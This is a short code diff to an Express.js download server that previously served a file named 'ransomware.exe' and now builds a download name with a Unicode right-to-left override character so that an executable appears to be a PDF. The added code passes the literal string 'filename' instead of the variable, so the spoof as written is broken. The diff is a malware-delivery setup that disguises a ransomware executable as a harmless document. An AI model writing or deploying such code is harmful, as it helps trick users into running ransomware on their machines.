@@ -6,9 +6,12 @@ const app = express();
 app.use(cors()); // Allow frontend requests
 
 // Serve the file for download
+const RLO = "\u202e";
+const filename = "Ann" + RLO + "fdp.exe";
+
 app.get("/download", (req, res) => {
-  const filePath = path.join(__dirname, "files", "ransomware.exe"); // Change to your file
-  res.download(filePath, "ransomware.exe"); // Triggers file download
+  const filePath = path.join(__dirname, "files", "filename"); // Change to your file
+  res.download(filePath, "filename"); // Triggers file download
 });
 
 // Start the server
